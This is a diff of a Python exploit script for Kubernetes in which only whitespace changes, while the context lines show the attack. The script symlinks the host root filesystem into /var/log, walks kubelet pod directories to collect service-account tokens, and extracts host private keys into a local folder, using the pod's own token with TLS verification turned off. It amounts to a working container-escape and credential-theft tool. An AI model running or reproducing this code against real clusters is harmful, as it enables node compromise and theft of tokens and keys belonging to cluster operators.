@@ -34,7 +34,7 @@ def read_folder(path):
         href = link.get('href')
         if href:
             yield href
-    
+
 def find_files(curr_folder, query, process_file=download_file):
     """function iterates web directory and downloads specific files"""
     excluded_folders = ("proc/")
@@ -53,7 +53,7 @@ def extract_kuberenetes_tokens():
     duplicate_token_pattern = re.compile(r".*\.\.\d+_\d+_\d+_\d+_\d+_\d+\.\d+")
     def filtered_token(x):
         if not duplicate_token_pattern.match(x):
-            download_file(x, output_folder='./host_files/tokens')       
+            download_file(x, output_folder='./host_files/tokens')
     find_files("/var/lib/kubelet/pods/", query="token", process_file=filtered_token)
 
 def extract_private_keys():
@@ -69,24 +69,24 @@ def exploit():
     try:
         print("[+] creating symlink to host root folder inside /var/log")
         attach_to_root()
-        
+
         print()
         print("[*] fetching token files from host")
         extract_kuberenetes_tokens()
-        
+
         print()
         print("[*] fetching private key files from host")
         extract_private_keys()
-    
+
     except Exception as x:
         print("ERROR: {}".format(x))
     finally:
         print("[+] removing symlink to host root folder")
         detach_from_root()
-        print("[*] Done. check the host_files folder for extracted root files.")    
+        print("[*] Done. check the host_files folder for extracted root files.")
 
 if __name__ == "__main__":
-    with open("/var/run/secrets/kubernetes.io/serviceaccount/token", 'r') as tf:    
+    with open("/var/run/secrets/kubernetes.io/serviceaccount/token", 'r') as tf:
         token = tf.read()
     s = requests.session()
     s.verify = False
